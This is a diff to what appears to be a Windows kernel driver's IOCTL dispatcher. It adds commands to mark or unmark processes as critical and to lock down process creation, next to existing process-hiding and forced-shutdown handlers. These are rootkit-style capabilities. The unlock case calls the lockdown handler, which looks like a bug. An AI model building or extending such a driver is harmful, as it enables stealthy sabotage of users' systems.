@@ -1,4 +1,4 @@
-#pragma warning(disable: 4100 4022 4311 4002 6064 4047 4024)
+//#pragma warning(disable: 4100 4022 4311 4002 6064 4047 4024)
 #include "ioctl.h"
 #include "defines.h"
 #include "memory.h"
@@ -13,7 +13,6 @@ NTSTATUS CreateCall(PDEVICE_OBJECT pDevObj, PIRP Irp)
 	DbgPrintEx(0, 0, "CreateCall is called, connection established");
 	IoCompleteRequest(Irp, IO_NO_INCREMENT);
 	return STATUS_SUCCESS;
-
 }
 
 NTSTATUS CloseCall(PDEVICE_OBJECT pDevObj, PIRP Irp)
@@ -64,6 +63,17 @@ NTSTATUS IoControl(PDEVICE_OBJECT pDevObj, PIRP Irp)
 	case IO_HIDE_PROCESS: {
 		PKERNEL_HIDE_PROCESS_REQUEST ReadInput = (PKERNEL_HIDE_PROCESS_REQUEST)Irp->AssociatedIrp.SystemBuffer;
 		HandleKeHideProcessRequest(ReadInput);
+
+		break;
+	}
+	case IO_SET_CRITICAL_STAT: {
+		PKERNEL_SET_DELETE_CRITICAL_PROCESS_STAT_REQUEST  ReadInput = (PKERNEL_SET_DELETE_CRITICAL_PROCESS_STAT_REQUEST)Irp->AssociatedIrp.SystemBuffer;
+		HandleSetProcessCriticalStatRequest(&Status, ReadInput);
+		break;
+	}
+	case IO_DELETE_CRITICAL_STAT: {
+		PKERNEL_SET_DELETE_CRITICAL_PROCESS_STAT_REQUEST ReadInput = (PKERNEL_SET_DELETE_CRITICAL_PROCESS_STAT_REQUEST)Irp->AssociatedIrp.SystemBuffer;
+		HandleDeleteProcessCriticalStatRequest(&Status, ReadInput);
 		break;
 	}
 
@@ -84,13 +94,26 @@ NTSTATUS IoControl(PDEVICE_OBJECT pDevObj, PIRP Irp)
 		NtShutdownSystem(ShutdownPowerOff);
 		break;
 	}
-	default:
+	case IO_LOCKDOWN_PROCESS_CREATION: {
+		DbgPrintEx(0, 0, "Lockdown process creation!!!!!!");
+		HandleLockdownProcessCreation(&Status);
+		break;
+	}
+
+	case IO_UNLOCK_PROCESS_CREATION: {
+		DbgPrintEx(0, 0, "Unlock process creation!!!!!!");
+		HandleLockdownProcessCreation(&Status);
+		break;
+	}
+	default: {
 		ByteIO = 0;
 		break;
 	}
 
+	}
 	Irp->IoStatus.Status = Status;
 	Irp->IoStatus.Information = ByteIO;
 	IoCompleteRequest(Irp, IO_NO_INCREMENT);
 	return Status;
+
 }
